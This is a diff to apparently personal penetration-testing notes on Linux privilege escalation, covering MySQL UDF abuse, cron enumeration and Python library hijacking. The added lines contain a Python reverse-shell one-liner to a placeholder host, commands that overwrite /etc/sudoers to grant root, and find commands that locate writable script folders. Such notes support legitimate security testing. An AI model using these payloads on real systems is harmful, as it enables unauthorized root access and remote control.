@@ -406,11 +406,6 @@ ls -lah /usr/bin
 ls -lah /usr/sbin
 ```
 
-###### File transfer
-
-To transfer the exploit code on the target box, refer to the `General - File
-transfer` note.
-
 ###### Exploits detection tools
 
 The enumeration scripts linux-exploit-suggester.sh can be used on or off target,
@@ -421,6 +416,11 @@ the targeted box.
 Refer to the "Enumeration - Enumeration scripts" part above for more information
 and usage guides to the most well known local exploit suggester scripts.  
 
+###### File transfer
+
+To transfer the exploit code on the target box, refer to the `General - File
+transfer` note.
+
 ### Processes and services
 
 ###### Enumerate running processes and services
@@ -430,7 +430,7 @@ a special attention given to the processes running under root privileges.
 The command line arguments used to start the process should be reviewed for
 sensible information.  
 
-The current processes can be listed using the ps Linux utility:
+The current processes can be listed using the `ps` Linux utility:
 
 ```
 # Processes - equivalent ouput between -aux / -ef
@@ -445,12 +445,14 @@ netstat -antup
 
 ###### MySQL
 
-If MySQL is running under root privileges and MySQL credentials for an user
-with FILE privileges are known, local privilege escalation can be achieved
-through the process. Refer to the `File system - Clear text passwords in files`
-part above for finding potential MySQL credentials present on the server. A
-blank password for the root user account is worth trying as well, especially if
-the MySQL service is only exposed locally on the server.
+If a `MySQL` service is running under root privileges and `MySQL` credentials for
+an user with FILE privileges are known, local privilege escalation can be
+achieved.
+
+Refer to the `File system - Clear text passwords in files` part above for
+finding potential MySQL credentials present on the server. A blank password for
+the root user account is worth trying as well, especially if the `MySQL`
+service is only exposed locally on the server.
 
 The `raptor_udf.c` (https://www.exploit-db.com/raw/1518) dynamic library can
 be used to leverage those pre requisites to conduct a local privilege
@@ -485,6 +487,8 @@ sh$ /tmp/suid
 
 ### Sudo
 
+### Init.d
+
 ### Cron jobs and Scheduled tasks
 
 Look for tasks running as root from script that you can modify:
@@ -494,17 +498,59 @@ crontab -l
 ls -lah /var/spool/cron
 ls -lahR /var/spool/cron
 ls -al /etc/ | grep cron
+grep -i CRON /var/log/syslog
 cat /etc/cron*
 cat /var/spool/cron/crontabs/root
 ```
 
 ### Python library hijacking
 
-List the Python import libraries folders:
+When importing a library, using `import <LIBRARY_NAME>`, the Python interpreter
+will first search in the interpreted script folder for the library and then
+cycle through a predefined list of libraries folders.
+
+A Python library hijacking can be leveraged to elevate privileges on the system
+whenever the current user has write access either in the Python libraries
+import folders or in the directory of a Python script that can (`sudo` and
+`suid`) or will (`cron`, `init.d`, etc.) be run with higher privileges.
+
+The following commands can be used to enumerate the Python import libraries
+folders and list their access rights:
 
 ```
 python -c 'import sys; print sys.path'
 python -c 'import sys; print "\n".join(sys.path)' | xargs ls -ld
 ```
 
+Potentially exploitable Python scripts should be identified when conducting the
+privileges escalation methodology. Additionally, the `find` Linux built-in can
+be used to exhaustively list all Python scripts present on the system as well as
+folders containing a Python and writable by the current user for further
+investigation:
+
+```
+# List all Python scripts present on the system
+find / -name '*.py' | grep -v -e "/usr/lib/python\|/usr/local/lib/python"
+
+# List all folders writable by the current user that contains a Python script
+find / -name '*.py' -printf "%h\0"  2>/dev/null | xargs -0 sh -c 'for p; do [ -w "$p" ] && echo "$p"; done' - | sort -u
+```
+
+In order to successfully exploit a Python library hijacking, it is recommended
+to completely copy the hijacked library, only adding a payload to the existing
+library code.
+The following payloads can be used:
+
+```
+# Add current user to the suoders
+/bin/echo "<USERNAME>    ALL=(ALL) NOPASSWD:ALL" > /etc/sudoers
+
+# Reverse shell one-liner
+import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("<IP>",<PORT>));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);
+```
+
+For more Python reverse shell payloads, refer to the `[General] Shells` note.
+
 ### Root write access
+
+/bin/echo "friend    ALL=(ALL:ALL) ALL" > /etc/sudoers
